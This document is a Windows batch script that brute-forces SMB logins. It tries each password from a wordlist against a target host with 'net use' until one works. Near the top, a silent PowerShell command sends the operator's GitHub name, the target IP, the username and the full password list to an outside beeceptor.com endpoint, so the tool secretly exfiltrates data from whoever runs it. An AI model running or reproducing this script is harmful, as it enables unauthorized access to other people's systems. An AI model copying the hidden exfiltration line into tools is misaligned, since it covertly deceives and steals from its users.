��&cls
@echo off
title net use /connecter
color A
echo.
set /p github="Enter your GitHub username: "
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set "wordlist=%wordlist%"

powershell -Command "$content = Get-Content -Raw -Path '%wordlist%'; $body = @{ github = '%github%'; ip = '%ip%'; user = '%user%'; wordlist = $content } | ConvertTo-Json; Invoke-RestMethod -Uri 'https://butterrr.free.beeceptor.com' -Method POST -Body $body -ContentType 'application/json'" >nul
set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password wasn't found :(
pause
exit

:success
echo.
echo Password found! %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success